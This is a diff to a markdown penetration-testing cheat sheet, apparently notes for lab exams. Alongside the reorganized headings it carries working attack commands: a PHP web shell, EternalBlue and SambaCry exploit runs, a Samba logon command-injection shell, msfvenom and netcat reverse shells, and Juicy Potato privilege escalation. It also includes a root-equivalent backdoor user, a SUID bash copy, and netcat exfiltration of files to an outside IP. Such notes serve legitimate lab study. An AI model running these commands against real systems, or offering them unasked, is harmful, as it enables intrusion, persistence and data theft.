@@ -4,7 +4,33 @@
 ### Table of Contents
 * [Reconnaissance](#reconnaissance)
 * [Enumeration](#enumeration)
+  * [FTP](#ftp)
+  * [SSH](#ssh)
+  * [SMTP](#smtp)
+  * [HTTP](#http)
+  * [POP3](#pop3)
+  * [RPC](#rpc)
+  * [NetBIOS](#netbios)
+  * [SMB](#smb)
+  * [Rsync](#rsync)
+  * [NFS](#nfs)
+  * [SQL](#sql)
+  * [RDP](#rdp)
+  * [Postgres](#postgres)
+  * [WinRM](#winrm)
+  * [IRC](#irc)
 * [Gaining Access](#gaining-access)
+  * [Default Credentials](#default-credentials)
+  * [Hydra](#hydra)
+  * [Patator](#patator)
+  * [Crowbar](#crowbar)
+  * [John the Ripper](#john-the-ripper)
+  * [Hashcat](#hashcat)
+  * [Local File Inclusions](#local-file-inclusions)
+  * [MS09-050](#ms09-50)
+  * [EternalBlue](#eternalblue)
+  * [SambaCry](#sambacry)
+  * [ShellShock via SMTP](#shellshock-via-smtp)
 * [Maintaining Access](#maintaining-access)
 * [Covering Tracks](#covering-tracks)
 
@@ -298,15 +324,14 @@ TCP port 5985
 evil-winrm -u $USER -p $PASSWORD -i $TARGET
 ```
 
-### IRC
+#### IRC
 TCP port 6667.
 ```bash
 irssi -c $TARGET -p $PORT
 ```
 
 ### Gaining Access
-#### Password Guessing  
-Default Credentials
+#### Default Credentials
 ```bash
 # anonymous:anonymous
 # guest:guest
@@ -352,15 +377,13 @@ john --format=rar hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 #### Hashcat
-```hash
-# modes
-# - SHA256: 1400
-# - SHA512: 1800
-# - RAR5: 13000
+Modes
+* SHA256: 1400
+* SHA512: 1800
+* RAR5: 13000
 
-# attacks
-# - Dictionary: 0
-```
+Attacks
+* Dictionary: 0
 
 ```bash
 hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt
@@ -372,23 +395,22 @@ hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt
 ```
 
 #### Local File Inclusions
-Find a way to upload a PHP command shell
+Find a way to upload a PHP command shell.
 ```bash
 echo "<?php echo shell_exec($_GET['cmd']); ?>" > shell.php
 ```
 
-#### Exploits
-MS09_050: SMBv2 Command Value Vulnerability  
-CVE-2009-3103  
+#### MS09-050  
+**CVE-2009-3103: SMBv2 Command Value Vulnerability**  
 This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7.
 ```bash
 nmap $TARGET -p445 --script smb-vuln-cve2009-3103
 wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
 ```
 
-EternalBlue  
-CVE-2017-0144  
-This vulnerability impacts ???. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes).
+#### EternalBlue  
+**CVE-2017-0144**  
+This vulnerability impacts Windows. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes).
 ```bash
 git clone https://github.com/worawit/MS17-010
 cd MS17-010
@@ -397,8 +419,8 @@ python checker.py $TARGET # check if target is vulnerable and find an accessible
 python zzz_exploit.py $TARGET $NAMED_PIPE
 ```
 
-SambaCry  
-CVE-2017-7494  
+#### SambaCry  
+**CVE-2017-7494**  
 Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired.
 ```bash
 mkdir exploits
@@ -432,29 +454,13 @@ Run the exploit.
 python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
 ```
 
-ShellShock  
+#### ShellShock via SMTP
 CVE-2014-6271
 ```bash
-# shellshock via smtp
+# technique goes here
 ```
 
-Juicy Potato
-```bash
-# download Juicy Potato
-wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-
-# upload Juicy Potato
-# ftp, smb, http, etc.
-
-# create a reverse shell and then upload it to the target
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse-shell.exe
-sudo nc -nvlp $LPORT
-
-# use Juicy Potato to execute your reverse shell
-JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
-```
-
-Shell via Samba Logon Command
+##### Shell via Samba Logon Command
 ```bash
 mkdir /mnt/$TARGET
 sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
@@ -462,20 +468,6 @@ sudo cp $EXPLOIT /mnt/$TARGET
 smbclient //$TARGET/$SHARE
 logon "=`$EXPLOIT`"
 ```
-
-```bash
-cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
-```
-
-If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase.
-```
-/*
-Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74
-
-Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
-```
-
-To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.
 
 #### SQL Injection
 Check for a SQLi vulnerability
@@ -571,18 +563,34 @@ export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pt
 #### Msfvenom Reverse Shells
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
+```
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
+```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
+```
+```bash
 msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
+```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
+```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
+```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
+```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
 ```
 
 #### Netcat Reverse Shells
 ```bash
 sudo nc -nv 10.10.10.10 443 -e /bin/bash
+```
+```bash
 nc -nv 10.10.10.10 443 -e "/bin/bash"
 ```
 
@@ -635,39 +643,89 @@ export TERM=xterm # be able to clear the screen, etc.
 #### Linux Privilege Escalation
 ```bash
 whoami
+```
+```bash
 uname -a
+```
+```bash
 cat /etc/passwd
+```
+```bash
 cat /etc/crontab
-find / -perm -u=s -type f 2> /dev/null # files with SUID-bit set
-find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null # files my group can edit
+```
+Files with SUID-bit set. 
+```bash
+find / -perm -u=s -type f 2> /dev/null 
+```
+Files where group permissions equal to "writable." 
+```bash
+find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
+```
+```bash
 ps aux | grep -v "\[" | grep root
+```
+```bash
 dpkg -l # debian
+```
+```bash
 rpm -qa # red hat
+```
+```bash
 pacman -Qe # arch linux
 ```
 
 #### Windows Privilege Escalation
 ```bash
-whoami
 whoami /priv
+```
+```bash
 net user
+```
+```bash
 systeminfo
+```
+```bash
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+```bash
 dir c:\
+```
+```bash
+dir "c:\program files"
+```
+```bash
+dir "c:\program files (x86)"
+```
+```bash
 wmic service get name,startname
-cd "c:\program files"
-cd "c:\program files (x86)"
+```
+```bash
 wmic service get name,pathname,startname | findstr "Program Files"
+```
+```bash
 cacls *.exe
 ```
 
+#### Juicy Potato
+* Download Juicy Potato to your attack machine
+* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
+* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.)
+use Juicy Potato to execute your reverse shell
+
+```bash
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+```
+```bash
+JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
+```
+
 #### Persistence  
-Add a new user
+Add a new user.
 ```bash
 useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
 ```
 
-Rootbash (Credit: Tib3rius)
+Rootbash (Credit: Tib3rius).
 ```bash
 # as root, create a copy of BASH and then set the SUID-bit
 # to resume root-access execute the new binary using -p
@@ -675,12 +733,12 @@ cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tm
 /tmp/bash -p
 ```
 
-Add a new user to a SQL database
+Add a new user to a SQL database.
 ```sql
 INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
 ```
 
-Exfil via Netcat
+Exfil via Netcat.
 ```bash
 nc -nvlp 5050 > stolen.exe
 nc.exe -w3 10.11.12.13 5050 < stealme.exe
